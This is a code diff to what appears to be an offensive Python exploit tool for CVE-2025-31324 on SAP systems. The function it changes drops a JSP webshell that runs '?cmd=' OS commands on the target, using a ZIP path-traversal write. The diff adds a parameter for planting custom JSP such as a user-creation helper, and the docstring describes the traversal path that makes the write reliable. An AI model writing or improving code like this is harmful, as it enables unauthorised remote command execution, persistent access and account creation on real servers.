@@ -566,16 +566,25 @@ def _build_drop_payload(shell_name: str, jsp_b64: str) -> bytes:
 def exploit_cve_2025_31324_dropshell(host: str, port: int,
                                        use_https: bool = False,
                                        shell_name: Optional[str] = None,
-                                       timeout: float = 15.0) -> dict:
-    """Drop a JSP webshell at `/irj/<random>.jsp` on the target.
+                                       timeout: float = 15.0,
+                                       jsp_content: Optional[str] = None) -> dict:
+    """Drop a JSP at `/irj/<random>.jsp` on the target.
 
-    The shell executes `?cmd=<os-command>` and returns stdout+stderr inside
-    a `<pre>` block.  Returns dict:
+    When ``jsp_content`` is omitted, drops the built-in ``?cmd=…`` webshell
+    (returns output in a ``<pre>`` block).  Callers that need to deploy a
+    custom JSP (e.g. the UME create-user helper) can supply the JSP source
+    directly — this re-uses the proven metadatauploader ZIP-traversal write
+    path (``../apps/sap.com/irj/servlet_jsp/irj/root/…``) which resolves
+    relative to the running deserialiser, avoiding the absolute-path guess
+    that breaks on non-standard instance names (JC<nr>, shared mounts, etc).
+
+    Returns dict:
         success, http_status, shell_name, shell_url, evidence, used_uid
     """
     if not shell_name:
         shell_name = _random_filename()
-    jsp_b64 = base64.b64encode(_JSP_WEBSHELL.encode()).decode()
+    body = jsp_content if jsp_content is not None else _JSP_WEBSHELL
+    jsp_b64 = base64.b64encode(body.encode()).decode()
 
     url = _build_url(host, port, use_https)
     scheme = "https" if use_https else "http"
